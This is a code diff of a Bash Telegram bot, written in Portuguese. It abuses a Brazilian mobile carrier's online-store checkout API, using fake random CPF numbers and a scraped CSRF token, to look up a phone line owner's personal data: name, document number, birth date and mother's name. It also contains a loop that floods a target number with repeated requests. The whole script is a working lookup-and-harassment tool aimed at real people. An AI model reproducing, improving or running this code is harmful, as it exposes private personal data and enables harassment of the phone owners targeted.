@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 function help_text()
 {
@@ -50,12 +50,23 @@ function flood_help_text()
 
 declare -rgf 'flood_help_text'
 
-function api_unknown_error_text()
+function unknown_error_text()
 {
 
 	cat <<- TEXT
 	
 	Ocorreu um erro ao tentar processar sua solicitação. Tente novamente dentro de alguns minutos ou refaça a consulta utilizando um outro número de telefone.
+	$(
+		if [[ $(wc -w < "${error_logs}") != '0' ]]; then
+			cat <<- ERRORS
+			
+			*Standard error:*
+			
+			\`$(cat "${error_logs}")\`
+			
+			ERRORS
+		fi
+	)
 	
 	TEXT
 
@@ -129,7 +140,6 @@ function common_results_text()
 	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoPessoa' "${JSONResponse}" | ParseOutput)\`
 	*Documento*: \`$(GetObjectValue 'documento')\`
 	*Classificação*: \`$(jq --raw-output '.pessoa.documentos[][].tipoDocumento.classificacao' "${JSONResponse}" | ParseOutput)\`
-	*Código*: \`$(jq --raw-output '.pessoa.documentos[][].tipoDocumento.codigo' "${JSONResponse}" | ParseOutput)\`
 	*Sexo*: \`$(jq --raw-output '.pessoa.descricaoSexo' "${JSONResponse}" | ParseOutput)\`
 	*Nascimento*: \`$(GetObjectValue 'nascimento')\`
 	*Mãe*: \`$(GetObjectValue 'mae')\`
@@ -153,12 +163,11 @@ function common_results_text()
 	*Número*: \`$telephone\`
 	*Ativação*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.creationDate' "${JSONResponse}" | ConvertEpoch | ParseOutput)\`
 	*Pacote*: \`$(jq --raw-output '.pessoa.nomePlano' "${JSONResponse}" | ParseOutput)\`
-	*Código*: \`$(jq --raw-output '.pessoa.codigoPlano' "${JSONResponse}" | ParseOutput)\`
 	*Contratação*: \`$(jq --raw-output '.pessoa.dataAtivacaoAssinatura' "${JSONResponse}" | ConvertEpoch | ParseOutput)\`
 	*Atualização*: \`$(jq --raw-output '.pessoa.dataAlteracaoStatusAssinatura' "${JSONResponse}" | ConvertEpoch | ParseOutput)\`
-	*Ciclo mensal*: \`$(jq --raw-output '.data.vencimentoFatura' "${JSONResponse}" | ParseOutput)\`
 	*Custo*: \`$(jq --raw-output '.currentPlan.price' "${JSONResponse}" | ParseOutput)\`
 	*Status*: \`$(jq --raw-output '.pessoa.descricaoStatusAssinatura' "${JSONResponse}" | ParseOutput)\`
+	*Ciclo mensal*: \`$(jq --raw-output '.data.vencimentoFatura' "${JSONResponse}" | ParseOutput)\`
 	*Conta digital*: \`$(jq --raw-output '.data.contaDigital' "${JSONResponse}" | ParseOutput)\`
 	
 	RESULTS
@@ -177,7 +186,6 @@ function cnpj_results_text()
 	*Nome*: \`$(jq --raw-output '.pessoa.nomeCompleto' "${JSONResponse}" | ParseOutput)\`
 	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoPessoa' "${JSONResponse}" | ParseOutput)\`
 	*CNPJ*: \`$(jq --raw-output '.pessoa.documentos[][].numeroDocumento' "${JSONResponse}" | ParseOutput)\`
-	*Código*: \`$(jq --raw-output '.pessoa.documentos[][].tipoDocumento.codigo' "${JSONResponse}" | ParseOutput)\`
 	*Classificação*: \`$(jq --raw-output '.pessoa.documentos[][].tipoDocumento.classificacao' "${JSONResponse}" | ParseOutput)\`
 	
 	*Linha*:
@@ -188,10 +196,9 @@ function cnpj_results_text()
 	*Pacote*: \`$(jq --raw-output '.pessoa.nomePlano' "${JSONResponse}" | ParseOutput)\`
 	*Contratação*: \`$(jq --raw-output '.pessoa.dataAtivacaoAssinatura' "${JSONResponse}" | ConvertEpoch | ParseOutput)\`
 	*Atualização*: \`$(jq --raw-output '.pessoa.dataAlteracaoStatusAssinatura' "${JSONResponse}" | ConvertEpoch | ParseOutput)\`
-	*Ciclo (dia)*: \`$(jq --raw-output '.data.vencimentoFatura' "${JSONResponse}" | ParseOutput)\`
 	*Custo*: \`$(jq --raw-output '.currentPlan.price' "${JSONResponse}" | ParseOutput)\`
 	*Status*: \`$(jq --raw-output '.pessoa.descricaoStatusAssinatura' "${JSONResponse}" | ParseOutput)\`
-	*Classificação*: \`$(jq --raw-output '.pessoa.classificacaoStatusAssinatura' "${JSONResponse}" | ParseOutput)\`
+	*Ciclo mensal*: \`$(jq --raw-output '.data.vencimentoFatura' "${JSONResponse}" | ParseOutput)\`
 	*Conta digital*: \`$(jq --raw-output '.data.contaDigital' "${JSONResponse}" | ParseOutput)\`
 	
 	RESULTS
@@ -244,7 +251,7 @@ function EncodeText()
 	
 		read -r 'DecodedText'
 	
-		declare -ri BytesCount="${#DecodedText}"
+		declare -r BytesCount="${#DecodedText}"
 		for (( i = 0; i < BytesCount; i++ ))
 		do
 			declare Character="${DecodedText:i:1}"
@@ -271,6 +278,7 @@ function ParseOutput()
 	sed '/null/d' | ( 
 		 					
 								read -r 'OriginalValue'
+								
 								if [ -z "${OriginalValue}" ]; then
 									printf 'NÃO CLASSIFICADO'
 								elif [ "${OriginalValue}" = 'true' ]; then
@@ -290,8 +298,10 @@ function ConvertEpoch()
 {
 
 	sed -r 's/\s|0{3}$//g' | (
+											
 												read -r 'EpochDate'
-												date '+%d/%m/%Y' -d "@$EpochDate"
+												date '+%d/%m/%Y' --date "@$EpochDate"
+											
 											)
 
 }
@@ -500,140 +510,26 @@ function GenerateYandex()
 
 declare -rgf 'GenerateYandex'
 
-function DetectRequestErrors()
+function DetectTransferErrors()
 {
 
-	declare -r ExitCode="${?}"
-
-	if [ "${ExitCode}" = '0' ]; then
-		return '0'
-	elif [ "${ExitCode}" = '1' ]; then
-		ErrorMessage='Unsupported protocol. This build of curl has no support for this protocol.'
-	elif [ "${ExitCode}" = '2' ]; then
-		ErrorMessage='Failed to initialize.'
-	elif [ "${ExitCode}" = '3' ]; then
-		ErrorMessage='URL malformed. The syntax was not correct.'
-	elif [ "${ExitCode}" = '4' ]; then
-		ErrorMessage='A feature or option that was needed to perform the desired request was not enabled or was explicitly disabled at build-time. To make curl able to do this, you probably need another build of libcurl!'
-	elif [ "${ExitCode}" = '5' ]; then
-		ErrorMessage='Couldn'\''t resolve proxy. The given proxy host could not be resolved.'
-	elif [ "${ExitCode}" = '6' ]; then
-		ErrorMessage='Couldn'\''t resolve host. The given remote host was not resolved.'
-	elif [ "${ExitCode}" = '7' ]; then
-		ErrorMessage='Failed to connect to host.'
-	elif [ "${ExitCode}" = '8' ]; then
-		ErrorMessage='Weird server reply. The server sent data curl couldn'\''t parse.'
-	elif [ "${ExitCode}" = '16' ]; then
-		ErrorMessage='HTTP/2 error. A problem was detected in the HTTP2 framing layer. This is somewhat generic and can be one out of several problems, see the error message for details.'
-	elif [ "${ExitCode}" = '18' ]; then
-		ErrorMessage='Partial file. Only a part of the file was transferred.'
-	elif [ "${ExitCode}" = '12' ]; then
-		ErrorMessage='HTTP page not retrieved. The requested url was not found or returned another error with the HTTP error code being 400 or above.'
-	elif [ "${ExitCode}" = '23' ]; then
-		ErrorMessage='Write error. Curl couldn'\''t write data to a filesystem or similar.'
-	elif [ "${ExitCode}" = '26' ]; then
-		ErrorMessage='Read error. Various reading problems.'
-	elif [ "${ExitCode}" = '27' ]; then
-		ErrorMessage='Out of memory. A memory allocation request failed.'
-	elif [ "${ExitCode}" = '28' ]; then
-		ErrorMessage='Operation timeout. The specified time-out period was reached according to the conditions.'
-	elif [ "${ExitCode}" = '33' ]; then
-		ErrorMessage='HTTP range error. The range "command" didn'\''t work.'
-	elif [ "${ExitCode}" = '34' ]; then
-		ErrorMessage='HTTP post error. Internal post-request generation error.'
-	elif [ "${ExitCode}" = '35' ]; then
-		ErrorMessage='SSL connect error. The SSL handshaking failed.'
-	elif [ "${ExitCode}" = '36' ]; then
-		ErrorMessage='Bad download resume. Couldn'\''t continue an earlier aborted download.'
-	elif [ "${ExitCode}" = '37' ]; then
-		ErrorMessage='FILE couldn'\''t read file. Failed to open the file. Permissions?'
-	elif [ "${ExitCode}" = '42' ]; then
-		ErrorMessage='Aborted by callback. An application told curl to abort the operation.'
-	elif [ "${ExitCode}" = '43' ]; then
-		ErrorMessage='Internal error. A function was called with a bad parameter.'
-	elif [ "${ExitCode}" = '44' ]; then
-		ErrorMessage='Interface error. A specified outgoing interface could not be used.'
-	elif [ "${ExitCode}" = '47' ]; then
-		ErrorMessage='Too many redirects. When following redirects, curl hit the maximum amount.'
-	elif [ "${ExitCode}" = '48' ]; then
-		ErrorMessage='Unknown option specified to libcurl. This indicates that you passed a weird option to curl that was passed on to libcurl and rejected. Read up in the manual!'
-	elif [ "${ExitCode}" = '51' ]; then
-		ErrorMessage='The peer'\''s SSL certificate or SSH MD5 fingerprint was not OK.'
-	elif [ "${ExitCode}" = '52' ]; then
-		ErrorMessage='The server didn'\''t reply anything, which here is considered an error.'
-	elif [ "${ExitCode}" = '53' ]; then
-		ErrorMessage='SSL crypto engine not found.'
-	elif [ "${ExitCode}" = '54' ]; then
-		ErrorMessage='Cannot set SSL crypto engine as default.'
-	elif [ "${ExitCode}" = '55' ]; then
-		ErrorMessage='Failed sending network data.'
-	elif [ "${ExitCode}" = '56' ]; then
-		ErrorMessage='Failure in receiving network data.'
-	elif [ "${ExitCode}" = '58' ]; then
-		ErrorMessage='Problem with the certificate.'
-	elif [ "${ExitCode}" = '59' ]; then
-		ErrorMessage='Couldn'\''t use specified SSL cipher.'
-	elif [ "${ExitCode}" = '60' ]; then
-		ErrorMessage='Peer certificate cannot be authenticated with known CA certificates.'
-	elif [ "${ExitCode}" = '61' ]; then
-		ErrorMessage='Unrecognized transfer encoding.'
-	elif [ "${ExitCode}" = '63' ]; then
-		ErrorMessage='Maximum file size exceeded.'
-	elif [ "${ExitCode}" = '65' ]; then
-		ErrorMessage='Sending the data requires a rewind that failed.'
-	elif [ "${ExitCode}" = '66' ]; then
-		ErrorMessage='Failed to initialise SSL Engine.'
-	elif [ "${ExitCode}" = '75' ]; then
-		ErrorMessage='Character conversion failed.'
-	elif [ "${ExitCode}" = '76' ]; then
-		ErrorMessage='Character conversion functions required.'
-	elif [ "${ExitCode}" = '77' ]; then
-		ErrorMessage='Problem with reading the SSL CA cert (path? access rights?).'
-	elif [ "${ExitCode}" = '78' ]; then
-		ErrorMessage='The resource referenced in the URL does not exist.'
-	elif [ "${ExitCode}" = '80' ]; then
-		ErrorMessage='Failed to shut down the SSL connection.'
-	elif [ "${ExitCode}" = '82' ]; then
-		ErrorMessage='Could not load CRL file, missing or wrong format'
-	elif [ "${ExitCode}" = '83' ]; then
-		ErrorMessage='Issuer check failed'
-	elif [ "${ExitCode}" = '89' ]; then
-		ErrorMessage='No connection available, the session will be queued'
-	elif [ "${ExitCode}" = '90' ]; then
-		ErrorMessage='SSL public key does not matched pinned public key'
-	elif [ "${ExitCode}" = '91' ]; then
-		ErrorMessage='Invalid SSL certificate status.'
-	elif [ "${ExitCode}" = '92' ]; then
-		ErrorMessage='Stream error in HTTP/2 framing layer.'
-	fi
-
-	declare -r 'ErrorMessage'
-
-	if [ "${ExitCode}" != '0' ]; then
-		if [ -n "${ErrorMessage}" ]; then
-			editMessageText --chat_id "${message_chat_id}" \
-											--message_id "${result_message_id}" \
-											--text "A tentativa de conexão resultou em um erro:\n\n*Código*: \`$ExitCode\`\n*Descrição*: \`$ErrorMessage\`" \
-											--parse_mode 'markdown'
-			exit '0'
-		else
-			editMessageText --chat_id "${message_chat_id}" \
-											--message_id "${result_message_id}" \
-											--text "$(api_unknown_error_text)" \
-											--parse_mode 'markdown'
-			exit '0'
-		fi
+	if [ "${?}" != '0' ]; then
+		editMessageText --chat_id "${message_chat_id}" \
+										--message_id "${result_message_id}" \
+										--text "$(unknown_error_text)" \
+										--parse_mode 'markdown'
+		exit '1'
 	elif [[ $(wc -w "${DownloadableFile}") = '0' ]]; then
 		editMessageText --chat_id "${message_chat_id}" \
 										--message_id "${result_message_id}" \
-										--text "$(api_unknown_error_text)" \
+										--text "$(unknown_error_text)" \
 										--parse_mode 'markdown'
-		exit '0'
+		exit '1'
 	fi
 
 }
 
-declare -rgf 'DetectRequestErrors'
+declare -rgf 'DetectTransferErrors'
 
 function GetObjectValue()
 {
@@ -679,36 +575,30 @@ function SaveSessionData()
 									--message_id "${result_message_id}" \
 									--text 'Salvando cookies e tokens de acesso temporários...'
 
-	declare -r DownloadableFile="${CSRFTokenFile}"
-	
 	declare -rg CookiesFile=$(mktemp --dry-run)
-	declare -rg CSRFTokenFile=$(mktemp --dry-run)
+	declare -r CSRFTokenFile=$(mktemp --dry-run)
+
+	declare DownloadableFile="${CSRFTokenFile}"
 
 	curl --url "https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express?site=vivo&plan=${plan_code}&packages=VIDEOEMUSICA&site=vivocontrolle&origin=lpcontrolegiga" \
 		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
 		--request 'GET' \
 		--silent \
-		--http2 \
+		--http1.1 \
 		--tlsv1.2 \
-		--fail \
+		--tls-max '1.2' \
+		--fail-early \
 		--header 'Accept:' \
 		--user-agent "${UserAgent}" \
-		--no-buffer \
 		--ipv4 \
-		--no-progress-meter \
 		--connect-timeout '25' \
 		--cacert "${HOME}/Nourin/cacert.pem" \
-		--globoff \
-		--path-as-is \
-		--proto '=https' \
-		--tcp-nodelay \
 		--no-sessionid \
-		--ssl-reqd \
 		--no-keepalive \
 		--cookie-jar "${CookiesFile}" \
 		--output "${CSRFTokenFile}"
 	
-	DetectRequestErrors
+	DetectTransferErrors
 
 	declare -rg csrf_token=$(grep --max-count '1' --perl-regexp --only-matching --text 'CSRFToken.*"\b\K.+(?=")' "${CSRFTokenFile}")
 	
@@ -727,8 +617,8 @@ function SetEnvironmentVariables()
 	declare -rg JSONResponse=$(mktemp --dry-run)
 	declare -rg ServerHeaders=$(mktemp --dry-run)
 
-	declare -rg random_cpf=$(tr -dc '0-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '3')-$(tr -dc '0-9' < '/dev/urandom' | head -c '2')
-	declare -rgi random_number=$(shuf -i '1-9' --random-source '/dev/urandom' | head -c '2')
+	declare -rg random_cpf=$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '3').$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '3').$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '3')-$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '2')
+	declare -rg random_number=$(shuf --input-range '1-9'  --random-source '/dev/urandom' --head-count '1')
 	
 	if [ "${random_number}" = '1' ]; then
 		plan_code='VIVOCTRLF44N'
@@ -768,15 +658,15 @@ function CheckJSONResponse()
 	if [[ $(grep --max-count '1' --perl-regexp --only-matching --text '^HTTP/[0-9](\.[0-9]+)\s\K.+(?=\ )' "${ServerHeaders}") != '200' ]]; then
 		editMessageText --chat_id "${message_chat_id}" \
 										--message_id "${result_message_id}" \
-										--text "$(api_unknown_error_text)" \
+										--text "$(unknown_error_text)" \
 										--parse_mode 'markdown'
-		exit '0'
+		exit '1'
 	elif [[ -z $(jq --raw-output '.' "${JSONResponse}") ]]; then
 		editMessageText --chat_id "${message_chat_id}" \
 										--message_id "${result_message_id}" \
-										--text "$(api_unknown_error_text)" \
+										--text "$(unknown_error_text)" \
 										--parse_mode 'markdown'
-		exit '0'
+		exit '1'
 	fi
 	
 	if [[ $(jq --raw-output '.isLineVivo' "${JSONResponse}") = 'false' ]]; then
@@ -784,13 +674,13 @@ function CheckJSONResponse()
 										--message_id "${result_message_id}" \
 										--text "$(number_not_found_text)" \
 										--parse_mode 'markdown'
-		exit '0'
+		exit '1'
 	elif [[ $(jq --raw-output '.isPortability' "${JSONResponse}") = 'true' ]]; then
 		editMessageText --chat_id "${message_chat_id}" \
 										--message_id "${result_message_id}" \
 										--text "$(number_not_found_text)" \
 										--parse_mode 'markdown'
-		exit '0'
+		exit '1'
 	fi
 	
 	
@@ -803,9 +693,9 @@ function CheckJSONResponse()
 			if [ "${PessoaJuridica}" != 'true' ]; then
 				editMessageText --chat_id "${message_chat_id}" \
 												--message_id "${result_message_id}" \
-												--text "$(api_unknown_error_text)" \
+												--text "$(unknown_error_text)" \
 												--parse_mode 'markdown'
-				exit '0'
+				exit '1'
 			fi
 		fi
 	fi
@@ -827,35 +717,29 @@ function QueryNumber()
 									--message_id "${result_message_id}" \
 									--text 'Consultando informações na base de dados...'
 	
-	declare -r DownloadableFile="${JSONResponse}"
+	declare DownloadableFile="${JSONResponse}"
 	
 	curl --url 'https://lojaonline.vivo.com.br:443/vivostorefront/checkout-express/validateLine' \
 		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
 		--request 'POST' \
 		--silent \
-		--http2 \
+		--http1.1 \
 		--tlsv1.2 \
-		--fail \
+		--tls-max '1.2' \
+		--fail-early \
 		--header 'Accept:' \
 		--user-agent "${UserAgent}" \
-		--no-buffer \
 		--ipv4 \
-		--no-progress-meter \
 		--connect-timeout '25' \
 		--cacert "${HOME}/Nourin/cacert.pem" \
-		--globoff \
-		--path-as-is \
-		--proto '=https' \
-		--tcp-nodelay \
 		--no-sessionid \
-		--ssl-reqd \
 		--no-keepalive \
 		--dump-header "${ServerHeaders}" \
 		--cookie "${CookiesFile}" \
 		--data "planCode=${plan_code}&document=${random_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
 		--output "${JSONResponse}"
 	
-	DetectRequestErrors
+	DetectTransferErrors
 	
 	if [[ $(jq --raw-output '.pessoa.numeroDocumento' "${JSONResponse}") =~ [0-9]{11} ]]; then
 	
@@ -868,22 +752,16 @@ function QueryNumber()
 			--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
 			--request 'POST' \
 			--silent \
-			--http2 \
+			--http1.1 \
 			--tlsv1.2 \
-			--fail \
+			--tls-max '1.2' \
+			--fail-early \
 			--header 'Accept:' \
 			--user-agent "${UserAgent}" \
-			--no-buffer \
 			--ipv4 \
-			--no-progress-meter \
 			--connect-timeout '25' \
 			--cacert "${HOME}/Nourin/cacert.pem" \
-			--globoff \
-			--path-as-is \
-			--proto '=https' \
-			--tcp-nodelay \
 			--no-sessionid \
-			--ssl-reqd \
 			--no-keepalive \
 			--dump-header "${AnotherServerHeaders}" \
 			--cookie "${CookiesFile}" \
@@ -891,8 +769,8 @@ function QueryNumber()
 			--output "${AnotherJSONResponse}"
 		
 		if [[ -n $(jq --raw-output '.' "${AnotherJSONResponse}") ]]; then
-			mv --force "${AnotherJSONResponse}" "${JSONResponse}"
-			mv --force "${AnotherServerHeaders}" "${ServerHeaders}"
+			mv --force --no-target-directory "${AnotherJSONResponse}" "${JSONResponse}"
+			mv --force --no-target-directory "${AnotherServerHeaders}" "${ServerHeaders}"
 		fi
 	fi
 	
@@ -914,7 +792,9 @@ function FloodNumber()
 	
 	SetEnvironmentVariables
 
-	declare -i SuccessfullyFloods= && declare -i UnsuccessfullyFloods= && declare -i TotalOperations=
+	declare SuccessfullyFloods='0'
+	declare UnsuccessfullyFloods='0'
+	declare TotalOperations='0'
 
 	SaveSessionData
 
@@ -922,30 +802,24 @@ function FloodNumber()
 		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
 		--request 'POST' \
 		--silent \
-		--http2 \
+		--http1.1 \
 		--tlsv1.2 \
-		--fail \
+		--tls-max '1.2' \
+		--fail-early \
 		--header 'Accept:' \
 		--user-agent "${UserAgent}" \
-		--no-buffer \
 		--ipv4 \
-		--no-progress-meter \
 		--connect-timeout '25' \
 		--cacert "${HOME}/Nourin/cacert.pem" \
-		--globoff \
-		--path-as-is \
-		--proto '=https' \
-		--tcp-nodelay \
 		--no-sessionid \
-		--ssl-reqd \
 		--no-keepalive \
 		--cookie "${CookiesFile}" \
 		--data "planCode=${plan_code}&document=${random_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
 		--output "${JSONResponse}"
 	
-	DetectRequestErrors
+	DetectTransferErrors
 
-	declare -ri OperationStartedTimestamp=$(printf '%(%s)T')
+	declare -r OperationStartedTimestamp=$(printf '%(%s)T')
 
 	while true
 	do
@@ -953,22 +827,16 @@ function FloodNumber()
 			--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
 			--request 'POST' \
 			--silent \
-			--http2 \
+			--http1.1 \
 			--tlsv1.2 \
-			--fail \
+			--tls-max '1.2' \
+			--fail-early \
 			--header 'Accept:' \
 			--user-agent "${UserAgent}" \
-			--no-buffer \
 			--ipv4 \
-			--no-progress-meter \
 			--connect-timeout '25' \
 			--cacert "${HOME}/Nourin/cacert.pem" \
-			--globoff \
-			--path-as-is \
-			--proto '=https' \
-			--tcp-nodelay \
 			--no-sessionid \
-			--ssl-reqd \
 			--no-keepalive \
 			--cookie "${CookiesFile}" \
 			--data "planCode=${plan_code}&document=${random_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
@@ -983,7 +851,7 @@ function FloodNumber()
 		fi
 		
 		if [ "${TotalOperations}" -ge '100' ]; then
-			declare -ri OperationEndedTimestamp=$(printf '%(%s)T')
+			declare -r OperationEndedTimestamp=$(printf '%(%s)T')
 			editMessageText --chat_id "${message_chat_id}" \
 											--message_id "${result_message_id}" \
 											--text "$(flood_done_dialog)" \
@@ -1019,8 +887,11 @@ while true; do
 			exit '0'
 		fi
 		
-		declare -ri telephone=$(grep --max-count '1' --perl-regexp --only-matching --text '[0-9]+' <<< "${message_text}" | tr '\n' ' ' | sed -r 's/\s+//g; s/^(55|0)//g; s/([0-9]{2})([0-9]{8,9})$/\1\2/g; s/([0-9]{11})$/\1/g; s/^([0-9]{2}).*([0-9]{8})$/\19\2/gm')
+		declare -r telephone=$(grep --max-count '1' --perl-regexp --only-matching --text '[0-9]+' <<< "${message_text}" | tr '\n' ' ' | sed -r 's/\s+//g; s/^(55|0)//g; s/([0-9]{2})([0-9]{8,9})$/\1\2/g; s/([0-9]{11})$/\1/g; s/^([0-9]{2}).*([0-9]{8})$/\19\2/gm')
 		declare -r formatted_telephone=$(sed -r 's/^([0-9]{2})/(\1)/g; s/([0-9]{4})$/-\1/g; s/([0-9]{5})/+\1/g' <<< "${telephone}")
+
+		declare -r error_logs=$(mktemp --dry-run)
+		exec 2> >( tee --append "${error_logs}" )
 
 		if [[ "${message_text}" =~ ^(\!|/)'start'$ ]]; then
 			sendMessage --reply_to_message_id "${message_message_id}" \
